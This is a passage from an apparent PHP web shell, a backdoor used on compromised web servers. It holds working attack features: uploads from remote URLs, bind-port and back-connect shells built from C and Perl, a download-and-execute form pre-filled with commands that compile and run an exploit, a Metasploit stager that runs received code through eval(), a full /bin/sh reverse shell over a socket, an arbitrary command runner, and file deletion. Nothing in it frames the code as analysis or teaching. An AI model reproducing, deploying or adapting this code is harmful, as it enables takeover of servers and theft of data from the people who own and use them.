    } ?><br><br><center><div class="mybox"><form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post"><h1 class="k2ll33d2">Upload Files To The Server</h1><table class="tabnet" style="width:320px;padding:0 1px;"> <tr><th colspan="2">Local</th></tr> <tr><td colspan="2"><p style="text-align:center;"><input style="color:#000000;" type="file" name="file" />&nbsp;<input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"></p></td> <tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr> </tr> </table></form><br><table class="tabnet" style="width:320px;padding:0 1px;"> <tr><th colspan="2">Remote</th></tr> <tr><td colspan="2"><form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=upload"> <table><tr><td>link</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://site/file.*"></td></tr> <tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr> <tr><td><select size="1" class="inputz" name="pilihan"> <option value="wwget">wget</option> <option value="wlynx">lynx</option> <option value="wfread">fread</option> <option value="wfetch">fetch</option> <option value="wlinks">links</option> <option value="wget">GET</option> <option value="wcurl">curl</option> </select></td><td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"></td></tr></form></table></td> </tr> </table> <div style="text-align:center;margin:2px;"><?php echo $msg; ?></div></div></center>
<?php
} elseif (isset($_GET["x"]) && $_GET["x"] == "back") {
    if (
        isset($_POST["bind"]) &&
        !empty($_POST["port"]) &&
        !empty($_POST["bind_pass"]) &&
        $_POST["use"] == "C"
    ) {
        $port = trim($_POST["port"]);
        $passwrd = trim($_POST["bind_pass"]);
        tulis("bdc.c", $port_bind_bd_c);
        exe("gcc -o bdc bdc.c");
        exe("chmod 777 bdc");
        @unlink("bdc.c");
        exe("./bdc " . $port . " " . $passwrd . " &");
        $scan = exe("ps aux");
        if (eregi("./bdc $por", $scan)) {
            $msg = "<p>Process successed</p>";
        } else {
            $msg = "<p>Process Failed</p>";
        }
    } elseif (
        isset($_POST["bind"]) &&
        !empty($_POST["port"]) &&
        !empty($_POST["bind_pass"]) &&
        $_POST["use"] == "Perl"
    ) {
        $port = trim($_POST["port"]);
        $passwrd = trim($_POST["bind_pass"]);
        tulis("bdp", $port_bind_bd_pl);
        exe("chmod 777 bdp");
        $p2 = which("perl");
        exe($p2 . " bdp " . $port . " &");
        $scan = exe("ps aux");
        if (eregi("$p2 bdp $port", $scan)) {
            $msg = "<p>Process successed</p>";
        } else {
            $msg = "<p>Process Failed</p>";
        }
    } elseif (
        isset($_POST["backconn"]) &&
        !empty($_POST["backport"]) &&
        !empty($_POST["ip"]) &&
        $_POST["use"] == "C"
    ) {
        $ip = trim($_POST["ip"]);
        $port = trim($_POST["backport"]);
        tulis("bcc.c", $back_connect_c);
        exe("gcc -o bcc bcc.c");
        exe("chmod 777 bcc");
        @unlink("bcc.c");
        exe("./bcc " . $ip . " " . $port . " &");
        $msg = "trying to connect to " . $ip . " on port " . $port . " ...";
    } elseif (
        isset($_POST["backconn"]) &&
        !empty($_POST["backport"]) &&
        !empty($_POST["ip"]) &&
        $_POST["use"] == "Perl"
    ) {
        $ip = trim($_POST["ip"]);
        $port = trim($_POST["backport"]);
        tulis("bcp", $back_connect);
        exe("chmod +x bcp");
        $p2 = which("perl");
        exe($p2 . " bcp " . $ip . " " . $port . " &");
        $msg = "Trying to connect to " . $ip . " on port " . $port . " ...";
    } elseif (
        isset($_POST["expcompile"]) &&
        !empty($_POST["wurl"]) &&
        !empty($_POST["wcmd"])
    ) {
        $pilihan = trim($_POST["pilihan"]);
        $wurl = trim($_POST["wurl"]);
        $namafile = download($pilihan, $wurl);
        if (is_file($namafile)) {
            $msg = exe($wcmd);
        } else {
            $msg = "error: file not found $namafile";
        }
    } ?><br><br><br><br> <table class="tabnet"> <tr><th>Bind Port</th><th>Back connect</th><th>download and Exec</th></tr><tr><td> <table> <form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=back"><tr><td>Port</td><td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport; ?>"></td></tr> <tr><td>Password</td><td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"></td></tr> <tr><td>Use</td><td style="text-align:justify"><p><select class="inputz" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select><input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"></td></tr></form></table> </td> <td><table> <form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=back"><tr><td>IP</td><td><input class="inputz" type="text" name="ip" size="26" value="<?php echo getenv(
    "REMOTE_ADDR"
)
    ? getenv("REMOTE_ADDR")
    : "127.0.0.1"; ?>"></td></tr> <tr><td>Port</td><td><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"></td></tr> <tr><td>Use</td><td style="text-align:justify"><p><select size="1" class="inputz" name="use"><option value="Perl">Perl</option><option value="C">C</option></select> <input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"></td></tr></form></table> </td> <td> <table> <form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=back"><tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td></tr><tr><td>cmd</td><td><input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td> </tr> <tr><td><select size="1" class="inputz" name="pilihan"> <option value="wwget">wget</option> <option value="wlynx">lynx</option> <option value="wfread">fread</option> <option value="wfetch">fetch</option> <option value="wlinks">links</option><option value="wget">GET</option> <option value="wcurl">curl</option> </select></td><td colspan="2"><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"></td></tr></form></table></td></tr></table><div style="text-align:center;margin:2px;"><?php echo $msg; ?></div><br>
<?php
error_reporting(0);
function ss($t)
{
    if (!get_magic_quotes_gpc()) {
        return trim(urldecode($t));
    }
    return trim(urldecode(stripslashes($t)));
}
$s_my_ip = $_SERVER["REMOTE_ADDR"];
$rsport = "443";
$rsportb4 = $rsport;
$rstarget4 = $s_my_ip;
$s_result =
    "<center><div class='mybox' align='center'><td><h2>Reverse shell ( php )</h2><form method='post' actions='?y=<?php echo $pwd;?>&amp;x='back'><table class='myboxtbl'><tr><td style='width:100px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' name='rstarget4' value='" .
    $rstarget4 .
    "' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' name='sqlportb4' value='" .
    $rsportb4 .
    "' /></td></tr></table><input type='submit' name='xback_php' class='inputzbut' value='connect' style='width:120px;height:30px;margin:10px 2px 0 2px;' /><input type='hidden' name='d' value='" .
    $pwd .
    "' /></form></td></div><br><div class='mybox'><td><form method='POST'><table class='myboxtbl'><h2>Metasploit Connection </h2><tr><td style='width:100px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' size='40' name='yip' value='" .
    $my_ip .
    "' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' size='5' name='yport' value='443' /></td></tr></table><input class='inputzbut' type='submit' value='Connect' name='metaConnect' style='width:120px;height:30px;margin:10px 2px 0 2px;'></form></td></div></center>";
echo $s_result;
if ($_POST["metaConnect"]) {
    $ipaddr = $_POST["yip"];
    $port = $_POST["yport"];
    if ($ip == "" && $port == "") {
        echo "fill in the blanks";
    } else {
        if (false !== strpos($ipaddr, ":")) {
            $ipaddr = "[" . $ipaddr . "]";
        }
        if (is_callable("stream_socket_client")) {
            $msgsock = stream_socket_client("tcp://{$ipaddr}:{$port}");
            if (!$msgsock) {
                die();
            }
            $msgsock_type = "stream";
        } elseif (is_callable("fsockopen")) {
            $msgsock = fsockopen($ipaddr, $port);
            if (!$msgsock) {
                die();
            }
            $msgsock_type = "stream";
        } elseif (is_callable("socket_create")) {
            $msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            $res = socket_connect($msgsock, $ipaddr, $port);
            if (!$res) {
                die();
            }
            $msgsock_type = "socket";
        } else {
            die();
        }
        switch ($msgsock_type) {
            case "stream":
                $len = fread($msgsock, 4);
                break;
            case "socket":
                $len = socket_read($msgsock, 4);
                break;
        }
        if (!$len) {
            die();
        }
        $a = unpack("Nlen", $len);
        $len = $a["len"];
        $buffer = "";
        while (strlen($buffer) < $len) {
            switch ($msgsock_type) {
                case "stream":
                    $buffer .= fread($msgsock, $len - strlen($buffer));
                    break;
                case "socket":
                    $buffer .= socket_read($msgsock, $len - strlen($buffer));
                    break;
            }
        }
        eval($buffer);
        echo "[*] Connection Terminated";
        die();
    }
}
if (isset($_REQUEST["sqlportb4"])) {
    $rsportb4 = ss($_REQUEST["sqlportb4"]);
}
if (isset($_REQUEST["rstarget4"])) {
    $rstarget4 = ss($_REQUEST["rstarget4"]);
}
if ($_POST["xback_php"]) {
    $ip = $rstarget4;
    $port = $rsportb4;
    $chunk_size = 1337;
    $write_a = null;
    $error_a = null;
    $shell = "/bin/sh";
    $daemon = 0;
    $debug = 0;
    if (function_exists("pcntl_fork")) {
        $pid = pcntl_fork();
        if ($pid == -1) {
            exit(1);
        }
        if ($pid) {
            exit(0);
        }
        if (posix_setsid() == -1) {
            exit(1);
        }
        $daemon = 1;
    }
    umask(0);
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        exit(1);
    }
    $descriptorspec = [
        0 => ["pipe", "r"],
        1 => ["pipe", "w"],
        2 => ["pipe", "w"],
    ];
    $process = proc_open($shell, $descriptorspec, $pipes);
    if (!is_resource($process)) {
        exit(1);
    }
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);
    while (1) {
        if (feof($sock)) {
            break;
        }
        if (feof($pipes[1])) {
            break;
        }
        $read_a = [$sock, $pipes[1], $pipes[2]];
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
        if (in_array($sock, $read_a)) {
            $input = fread($sock, $chunk_size);
            fwrite($pipes[0], $input);
        }
        if (in_array($pipes[1], $read_a)) {
            $input = fread($pipes[1], $chunk_size);
            fwrite($sock, $input);
        }
        if (in_array($pipes[2], $read_a)) {
            $input = fread($pipes[2], $chunk_size);
            fwrite($sock, $input);
        }
    }
    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
    $rsres = " ";
    $s_result .= $rsres;
}

} elseif (isset($_GET["x"]) && $_GET["x"] == "shell") { ?> 
<form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post"> <table class="cmdbox"> <tr><td colspan="2">
<textarea class="output" readonly>
<?php if (isset($_POST["submitcmd"])) {
    echo @exe($_POST["cmd"]);
} ?> 
</textarea> <tr><td colspan="2"><?php echo $prompt; ?><input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Do !" name="submitcmd" style="width:12%;" /></td></tr> </table></form> 
<?php } else {if (isset($_GET["delete"]) && $_GET["delete"] != "") {
        $file = $_GET["delete"];
        @unlink($file);
    } elseif (isset($_GET["fdelete"]) && $_GET["fdelete"] != "") {
        @rmdir(rtrim($_GET["fdelete"], DIRECTORY_SEPARATOR));
    } elseif (isset($_GET["mkdir"]) && $_GET["mkdir"] != "") {
        $path = $pwd . $_GET["mkdir"];
        @mkdir($path);
    }
    $buff = showdir($pwd, $prompt);
    echo $buff;} ?></div></body></html>